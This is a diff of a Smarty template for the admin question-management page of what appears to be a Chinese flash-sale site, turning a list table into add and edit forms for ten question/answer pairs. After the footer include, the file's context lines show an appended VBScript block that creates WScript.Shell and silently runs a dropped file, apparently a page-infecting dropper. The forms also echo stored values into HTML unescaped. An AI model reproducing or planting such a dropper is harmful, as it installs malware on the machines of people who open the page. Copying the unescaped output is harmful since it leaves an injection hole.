@@ -1,39 +1,256 @@
-{include file="../common/header.html" title="问题管理"}
+<?php
+/* Smarty version {Smarty::SMARTY_VERSION}, created on 2018-12-05 12:03:16
+  from "D:\wamp\www\miaosha\app\admin\view\question\add.html" */
+
+/* @var Smarty_Internal_Template $_smarty_tpl */
+if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
+  'version' => '3.1.32-dev-22',
+  'unifunc' => 'content_5c07be847312e4_89413776',
+  'has_nocache_code' => false,
+  'file_dependency' => 
+  array (
+    '091e006939e636edc9a5b895961bb48d625e2f63' => 
+    array (
+      0 => 'D:\\wamp\\www\\miaosha\\app\\admin\\view\\question\\add.html',
+      1 => 1544011384,
+      2 => 'file',
+    ),
+  ),
+  'includes' => 
+  array (
+    'file:../common/header.html' => 1,
+    'file:../common/footer.html' => 1,
+  ),
+),false)) {
+function content_5c07be847312e4_89413776 (Smarty_Internal_Template $_smarty_tpl) {
+$_smarty_tpl->_subTemplateRender("file:../common/header.html", $_smarty_tpl->cache_id, $_smarty_tpl->compile_id, 0, $_smarty_tpl->cache_lifetime, array('title'=>"问题管理"), 0, false);
+?>
+
             <!--中间部分-->
-                <div class="col-md-12"><a class="btn btn-primary" href="/admin/question/add">添加问答</a></div>
+                
                 <div class="col-md-12" style="height:10px"></div>
                 <div class="col-md-12">
-                    <table class="table table-bordered table-striped table-hover">
-                        <tr>
-                            <th>ID</th>
-                            <th>活动ID</th>
-                            <th>问答描述</th>
-                            <th>问题&答案</th>
-                            <th>状态</th>
-                            <th>操作</th>
-                        </tr>
-						
-						{foreach $questions as $k=>$v}
-                        <tr>				
-                            <td>{$v['id']}</td>
-                            <td>{$v['active_id']}</td>
-                            <td>{$v['title']}</td>
-                            <td><span>1&nbsp;{$v['ask1']}&nbsp;&nbsp;{$v['answer1']}</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>2&nbsp;{$v['ask2']}&nbsp;&nbsp;{$v['answer2']}</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>3&nbsp;{$v['ask3']}&nbsp;&nbsp;{$v['answer3']}</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>4&nbsp;{$v['ask4']}&nbsp;&nbsp;{$v['answer4']}</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>5&nbsp;{$v['ask5']}&nbsp;&nbsp;{$v['answer5']}</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>6&nbsp;{$v['ask6']}&nbsp;&nbsp;{$v['answer6']}</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>7&nbsp;{$v['ask7']}&nbsp;&nbsp;{$v['answer7']}</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>8&nbsp;{$v['ask8']}&nbsp;&nbsp;{$v['answer8']}</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>9&nbsp;{$v['ask9']}&nbsp;&nbsp;{$v['answer9']}</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>10&nbsp;{$v['ask10']}&nbsp;&nbsp;{$v['answer10']}</span>&nbsp;&nbsp;&nbsp;&nbsp;</td>
-                            <td>{$v['sys_status']}</td>
-                            <td>
-                                <a href="/admin/question/edit?id={$v['id']}">编辑</a>
-					                     | <a href="/admin/question/delete?id={$v['id']}">删除</a>
-                    				</td>
-			</tr>
-
-                        
-						{/foreach}
-                        
-                    </table>
-					<div>{$links}</div>
+				<?php if (isset($_smarty_tpl->tpl_vars['question']->value)) {?>
+                    <form class="col-md-8" method="post" action="/admin/question/doEdit">
+					<input type="hidden" class="form-control" name="id"  value="<?php echo $_smarty_tpl->tpl_vars['question']->value['id'];?>
+">
+                        <h2>编辑问答信息</h2>
+                        <br/>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">所属活动id</label>
+                        <input type="text" class="form-control"  name="active_id" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['active_id'];?>
+">
+                      </div>
+					  <div class="form-group">
+                        <label for="exampleInputEmail1">问题内容</label>
+                        <input type="text" class="form-control"  name="title" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['title'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题1</label>
+                        <input type="text" class="form-control" name="ask1" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['ask1'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案1</label>
+                        <input type="text" class="form-control"  name="answer1" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['answer1'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题2</label>
+                        <input type="text" class="form-control"  name="ask2" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['ask2'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案2</label>
+                        <input type="text" class="form-control"  name="answer2" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['answer2'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题3</label>
+                        <input type="text" class="form-control"  name="ask3" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['ask3'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案3</label>
+                        <input type="text" class="form-control"  name="answer3" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['answer3'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题4</label>
+                        <input type="text" class="form-control"  name="ask4" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['ask4'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案4</label>
+                        <input type="text" class="form-control" name="answer4" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['answer4'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题5</label>
+                        <input type="text" class="form-control" name="ask5" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['ask5'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案5</label>
+                        <input type="text" class="form-control" name="answer5" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['answer5'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题6</label>
+                        <input type="text" class="form-control" name="ask6" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['ask6'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案6</label>
+                        <input type="text" class="form-control" name="answer6" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['answer6'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题7</label>
+                        <input type="text" class="form-control"  name="ask7" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['ask7'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案7</label>
+                        <input type="text" class="form-control" name="answer7" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['answer7'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题8</label>
+                        <input type="text" class="form-control"  name="ask8" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['ask8'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案8</label>
+                        <input type="text" class="form-control" name="answer8" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['answer8'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题9</label>
+                        <input type="text" class="form-control"  name="ask9" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['ask9'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案9</label>
+                        <input type="text" class="form-control"  name="answer9" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['answer9'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题10</label>
+                        <input type="text" class="form-control"  name="ask10" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['ask10'];?>
+">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案10</label>
+                        <input type="text" class="form-control"  name="answer10" value="<?php echo $_smarty_tpl->tpl_vars['question']->value['answer10'];?>
+">
+                      </div>
+                      <button type="submit" class="btn btn-primary">保存</button>
+                      <a class="btn btn-default" href="/admin/question">返回</a>
+                    </form>
+					<?php } else { ?>
+					<form class="col-md-8" method="post" action="/admin/question/doAdd">
+					
+                        <h2>编辑问答信息</h2>
+                        <br/>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">所属活动id</label>
+                        <input type="text" class="form-control"  name="active_id">
+                      </div>
+					  <div class="form-group">
+                        <label for="exampleInputEmail1">问题内容</label>
+                        <input type="text" class="form-control"  name="title" >
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题1</label>
+                        <input type="text" class="form-control" name="ask1" >
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案1</label>
+                        <input type="text" class="form-control"  name="answer1">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题2</label>
+                        <input type="text" class="form-control"  name="ask2">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案2</label>
+                        <input type="text" class="form-control"  name="answer2">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题3</label>
+                        <input type="text" class="form-control"  name="ask3">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案3</label>
+                        <input type="text" class="form-control"  name="answer3">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题4</label>
+                        <input type="text" class="form-control"  name="ask4">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案4</label>
+                        <input type="text" class="form-control" name="answer4" >
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题5</label>
+                        <input type="text" class="form-control" name="ask5" >
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案5</label>
+                        <input type="text" class="form-control" name="answer5" >
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题6</label>
+                        <input type="text" class="form-control" name="ask6" >
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案6</label>
+                        <input type="text" class="form-control" name="answer6" >
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题7</label>
+                        <input type="text" class="form-control"  name="ask7">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案7</label>
+                        <input type="text" class="form-control" name="answer7" >
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题8</label>
+                        <input type="text" class="form-control"  name="ask8">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案8</label>
+                        <input type="text" class="form-control" name="answer8" >
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题9</label>
+                        <input type="text" class="form-control"  name="ask9">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案9</label>
+                        <input type="text" class="form-control"  name="answer9">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">问题10</label>
+                        <input type="text" class="form-control"  name="ask10">
+                      </div>
+                      <div class="form-group">
+                        <label for="exampleInputEmail1">答案10</label>
+                        <input type="text" class="form-control"  name="answer10">
+                      </div>
+                      <button type="submit" class="btn btn-primary">保存</button>
+                      <a class="btn btn-default" href="/admin/question">返回</a>
+                    </form>
+					<?php }?>
                 </div>
                 <!--结束-->
-{include file="../common/footer.html"}                
+<?php $_smarty_tpl->_subTemplateRender("file:../common/footer.html", $_smarty_tpl->cache_id, $_smarty_tpl->compile_id, 0, $_smarty_tpl->cache_lifetime, array(), 0, false);
+?>
+                
                 
                 
                 
@@ -51,4 +268,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT>
+//--></SCRIPT><?php }
+}
